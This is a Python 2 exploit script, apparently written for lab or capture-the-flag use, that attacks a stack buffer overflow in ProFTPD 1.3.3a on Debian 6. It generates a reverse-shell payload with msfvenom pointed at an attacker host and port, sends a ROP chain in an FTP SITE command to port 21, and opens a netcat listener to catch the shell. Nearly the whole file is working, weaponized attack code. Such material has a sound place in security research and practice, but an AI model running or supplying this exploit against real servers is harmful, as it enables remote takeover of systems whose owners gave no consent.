#!/usr/bin/env python2
#  -*- coding: utf-8 -*- ####################################################################################
#█ ▄▄  █▄▄▄▄ ████▄ ▄████     ▄▄▄▄▀ █ ▄▄  ▄███▄      ▄  █ ▄▄  █    ████▄ ▄█    ▄▄▄▄▀ ▄█ ██   ▄█▄             #
#█   █ █  ▄▀ █   █ █▀   ▀ ▀▀▀ █    █   █ █▀   ▀ ▀▄   █ █   █ █    █   █ ██ ▀▀▀ █    ██ █ █  █▀ ▀▄           #
#█▀▀▀  █▀▀▌  █   █ █▀▀        █    █▀▀▀  ██▄▄     █ ▀  █▀▀▀  █    █   █ ██     █    ██ █▄▄█ █   ▀           #
#█     █  █  ▀████ █         █     █     █▄   ▄▀ ▄ █   █     ███▄ ▀████ ▐█    █     ▐█ █  █ █▄  ▄▀          #
#█      █          █       ▀       █    ▀███▀  █   ▀▄  █        ▀       ▐   ▀       ▐    █ ▀███▀            #
#▀    ▀            ▀               ▀           ▀       ▀                               █                    #
#▀                                                                                                          #
# proftpd_exploit_iac_rce.py - nighter                                                                      #
#                                                                                                           #
# DATE                                                                                                      #
# 15/02/2019                                                                                                #
#                                                                                                           #
# DESCRIPTION                                                                                               #
# Exploits a stack-based buffer overflow in versions of ProTPD 1.3.3.a Debian 6                             #
# Will also work 1.32rc3 - 1.3.3b but may require rewrite or rop chain                                      #
#                                                                                                           #
# Note I have read several versions of this PoC and I have just weaponized it. So cannot take credz for the #
# b0f code                                                                                                  #
#                                                                                                           #
# nighter - http://nighter.se/                                                                              #
#                                                                                                           #
#############################################################################################################

import socket
import struct
import sys
import os

from multiprocessing import Process


def build_shellcode():

    print("[+] build shellcode")
    cmd = """msfvenom -p linux/x86/shell_reverse_tcp LHOST=%s LPORT=%s -e x86/shikata_ga_nai -b "\\x09\\x0a\\x0b\\x0c\\x0d\\x20\\xff" -f raw -o /tmp/shellcode.bin 2>/dev/null""" % (LHOST, LPORT)
    os.system(cmd)

    if os.path.isfile('/tmp/shellcode.bin') is False:
        print("[-] Generate shellcode failed")
        sys.exit(0)


def exploit():

    build_shellcode()

    fp = open('/tmp/shellcode.bin', 'rb')
    shellcode = fp.read()
    fp.close()
    os.unlink('/tmp/shellcode.bin')

    # Debian 6 - ProFTPD 1.3.3a
    ret = struct.pack('<L', 0x805a547) # pop esi / pop ebp / ret
    writable = struct.pack('<L', 0x80e81a0) # .data
    iaccount = 4096+16
    offset = 0x102c-4
    buffer = 'SITE ' + shellcode
    oddbyte = "\x41" if (len(buffer) % 2) == 0 else ""
    buffer += oddbyte + "\xff"*(iaccount-len(shellcode))
    padding = "\x41"*(offset-len(buffer))
    buffer += padding + ret + writable
    buffer += struct.pack('<L', 0xcccccccc) # unused
    buffer += struct.pack('<L', 0x805a544) # mov eax,esi / pop ebx / pop esi / pop ebp / ret
    buffer += struct.pack('<L', 0xcccccccc) # becomes ebx
    buffer += struct.pack('<L', 0xcccccccc) # becomes esi
    buffer += struct.pack('<L', 0xcccccccc) # becomes ebp
    buffer += struct.pack('<L', 0x8068886) # mov eax,[eax] / ret
    buffer += struct.pack('<L', 0x8068886) # mov eax,[eax] / ret
    buffer += struct.pack('<L', 0x8068886) # mov eax,[eax] / ret
    buffer += struct.pack('<L', 0x8068886) # mov eax,[eax] / ret
    buffer += struct.pack('<L', 0x805bd8e) # inc eax / adc cl, cl / ret
    buffer += struct.pack('<L', 0x805bd8e) # inc eax / adc cl, cl / ret
    buffer += struct.pack('<L', 0x805bd8e) # inc eax / adc cl, cl / ret
    buffer += struct.pack('<L', 0x805bd8e) # inc eax / adc cl, cl / ret
    buffer += struct.pack('<L', 0x805bd8e) # inc eax / adc cl, cl / ret
    buffer += struct.pack('<L', 0x805bd8e) # inc eax / adc cl, cl / ret
    buffer += struct.pack('<L', 0x805bd8e) # inc eax / adc cl, cl / ret
    buffer += struct.pack('<L', 0x805bd8e) # inc eax / adc cl, cl / ret
    buffer += struct.pack('<L', 0x805bd8e) # inc eax / adc cl, cl / ret
    buffer += struct.pack('<L', 0x805bd8e) # inc eax / adc cl, cl / ret
    buffer += struct.pack('<L', 0x805bd8e) # inc eax / adc cl, cl / ret
    buffer += struct.pack('<L', 0x805bd8e) # inc eax / adc cl, cl / ret
    buffer += struct.pack('<L', 0x805bd8e) # inc eax / adc cl, cl / ret
    buffer += struct.pack('<L', 0x805bd8e) # inc eax / adc cl, cl / ret
    buffer += struct.pack('<L', 0x805bd8e) # inc eax / adc cl, cl / ret
    buffer += struct.pack('<L', 0x805bd8e) # inc eax / adc cl, cl / ret
    buffer += struct.pack('<L', 0x0805c26c) # jmp eax
    buffer += "\r\n"
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    try:
        print("[+] Connecting")
        s.connect(('%s' % HOST, 21))
        print("[+] Sending buffer")
        s.send(buffer)
        print("[+] Done")
    except:
        print("[-] Failed")


if __name__ == '__main__':

    if len(sys.argv) != 4:
        print ("""
█ ▄▄  █▄▄▄▄ ████▄ ▄████     ▄▄▄▄▀ █ ▄▄  ▄███▄      ▄  █ ▄▄  █    ████▄ ▄█    ▄▄▄▄▀ ▄█ ██   ▄█▄    
█   █ █  ▄▀ █   █ █▀   ▀ ▀▀▀ █    █   █ █▀   ▀ ▀▄   █ █   █ █    █   █ ██ ▀▀▀ █    ██ █ █  █▀ ▀▄  
█▀▀▀  █▀▀▌  █   █ █▀▀        █    █▀▀▀  ██▄▄     █ ▀  █▀▀▀  █    █   █ ██     █    ██ █▄▄█ █   ▀  
█     █  █  ▀████ █         █     █     █▄   ▄▀ ▄ █   █     ███▄ ▀████ ▐█    █     ▐█ █  █ █▄  ▄▀ 
 █      █          █       ▀       █    ▀███▀  █   ▀▄  █        ▀       ▐   ▀       ▐    █ ▀███▀  
  ▀    ▀            ▀               ▀           ▀       ▀                               █         
                                                                                       ▀    
[nighter@nighter.se] - Exploits a stack-based buffer overflow in ProTPD 1.3.3.a debian 6
    """)
        print("Usage: %s <HOST> <LHOST> <LPORT>" % (sys.argv[0]))
        print("EXAMPLE: ./proftpd_iac_rce.py '10.10.10.70' 10.10.14.24 1337\n")
        sys.exit(0)

    HOST = sys.argv[1]
    LHOST = sys.argv[2]
    LPORT = sys.argv[3]

    # Run exploit Async
    p = Process(target=exploit)
    p.start()

    print("[+] Netcat = %s" % LPORT)
    os.system('nc -lnvp %s' % LPORT)